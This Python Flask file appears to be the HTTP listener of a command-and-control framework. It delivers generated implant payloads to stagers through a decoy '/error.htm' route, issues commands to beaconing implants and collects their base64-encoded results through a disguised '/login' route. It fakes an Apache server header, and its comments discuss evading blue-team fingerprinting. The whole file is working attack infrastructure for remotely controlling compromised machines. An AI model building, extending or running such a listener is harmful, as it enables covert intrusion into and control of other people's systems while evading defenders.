from Data.Database import Database

from Implant.Implant import ImplantSingleton
from flask import Flask, request

from uuid import uuid4
import base64
import os, threading, sys, requests



Imp = ImplantSingleton.instance
db = Database()

app = Flask(str(uuid4()))
app.config['SECRET_KEY'] = str(uuid4())


@app.before_request
def before_request():
    # TODO: Implement IP whitelist and reject if connection if it is not a valid src IP.
    return


# Removing the Werkzeug header to reduce Fudges server fingerprinting.
@app.after_request
def alter_headers(response):
    response.headers['Server'] = "Apache/2.4.1 (Unix)"
    return response
# -- TODO: extracted and added into a new stager specific listener(?)


@app.route("/error.htm", methods=['GET'])
def stager():
    # This endpoint is responsible for generating the implant based on stager callbacks
    implant_data = db.implant.Register_NewImplantFromStagerKey(request.values['user'])
    if implant_data:
        output_from_parsed_template = Imp.GeneratePayload(implant_data)
        return output_from_parsed_template
    else:
        return "404", 404


@app.route("/", methods=["GET", "POST"])
def implant_beacon_endpoint():
    if 'X-Implant' not in request.headers:
        return "=="
    next_cmd = Imp.issue_command(request.headers['X-Implant'], "HttpsProfile")
    if next_cmd is not None:
        return next_cmd

    # Need to remove the use of == in beacons, this can be fingerprinted with ease.
    return "=="


@app.route("/login", methods=['GET', 'POST'])
def implant_command_result():
    # -- X-Result is a placeholder header and should be changed to a more realistic value
    response_stream_data = request.stream.read()
    decoded_response_stream_data = response_stream_data.decode()
    if "X-Result" in request.headers:
        command_id = decoded_response_stream_data[0:24]
        encoded_command = decoded_response_stream_data[24:]
        decoded_response = base64.b64decode(f"{encoded_command}==")
        Imp.command_response(command_id, decoded_response, "HttpsProfile")
    return "=="


# This should be randomised to avoid blueteams fingerprinting the server by querying this endpoint.
@app.route("/nlaksnfaobcaowb", methods=['GET', 'POST'])
def shutdown_listener():
    if request.remote_addr == "127.0.0.1":
        shutdown_hook = request.environ.get('werkzeug.server.shutdown')
        if shutdown_hook is not None:
            shutdown_hook()


def shutdown():
    raise RuntimeError("Server going down")